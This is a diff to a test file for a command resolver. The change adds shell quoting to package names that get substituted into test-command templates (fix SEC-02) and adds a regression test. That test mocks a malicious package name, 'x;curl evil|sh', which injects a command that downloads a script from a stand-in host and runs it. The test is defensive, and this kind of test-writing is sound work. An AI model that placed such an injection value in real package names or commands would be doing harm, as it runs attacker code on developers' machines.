@@ -74,7 +74,10 @@ describe("resolveQualityTestCommands — {{package}} substitution", () => {
         },
       });
       const result = await resolveQualityTestCommands(config, "/workdir", "packages/api");
-      expect(result.testScopedTemplate).toBe("bun test --filter=@acme/api");
+      // SEC-02: substituted names are shell-quoted (functionally identical
+      // under /bin/sh -c, since the shell strips the quotes before the
+      // command sees the argument).
+      expect(result.testScopedTemplate).toBe("bun test --filter='@acme/api'");
     } finally {
       _commandResolverDeps.readPackageName = origRead;
     }
@@ -94,6 +97,29 @@ describe("resolveQualityTestCommands — {{package}} substitution", () => {
       const result = await resolveQualityTestCommands(config, "/workdir");
       expect(result.testScopedTemplate).toBe("bun test --filter={{package}}");
       expect(_commandResolverDeps.readPackageName).not.toHaveBeenCalled();
+    } finally {
+      _commandResolverDeps.readPackageName = origRead;
+    }
+  });
+
+  // SEC-02: a repo-controlled package.json `name` was substituted into the
+  // {{package}} template with no shell quoting, then passed to `/bin/sh -c`.
+  // A name containing shell metacharacters must not reach the shell unescaped.
+  test("shell-quotes a package name containing shell metacharacters", async () => {
+    const origRead = _commandResolverDeps.readPackageName;
+    _commandResolverDeps.readPackageName = mock(() => Promise.resolve("x;curl evil|sh"));
+    try {
+      const config = makeConfig({
+        quality: {
+          ...DEFAULT_CONFIG.quality,
+          commands: { test: "bun test", testScoped: "bunx turbo run test --filter={{package}}" },
+        },
+      });
+      const result = await resolveQualityTestCommands(config, "/workdir", "packages/api");
+      // The substituted value must be POSIX single-quoted, so the shell sees
+      // one literal argument instead of executing `;curl evil|sh`.
+      expect(result.testScopedTemplate).toBe("bunx turbo run test --filter='x;curl evil|sh'");
+      expect(result.testScopedTemplate).not.toContain("--filter=x;curl");
     } finally {
       _commandResolverDeps.readPackageName = origRead;
     }
@@ -134,7 +160,8 @@ describe("resolveQualityTestCommands — orchestrator promotion", () => {
       });
       const result = await resolveQualityTestCommands(config, "/workdir", "apps/cli");
       expect(result.rawTestCommand).toBe("bunx turbo test");
-      expect(result.testCommand).toBe("bunx turbo test --filter=@koda/cli");
+      // SEC-02: shell-quoted substitution — see note above.
+      expect(result.testCommand).toBe("bunx turbo test --filter='@koda/cli'");
       expect(result.testScopedTemplate).toBeUndefined(); // cleared for orchestrators
       expect(result.isMonorepoOrchestrator).toBe(true);
     } finally {
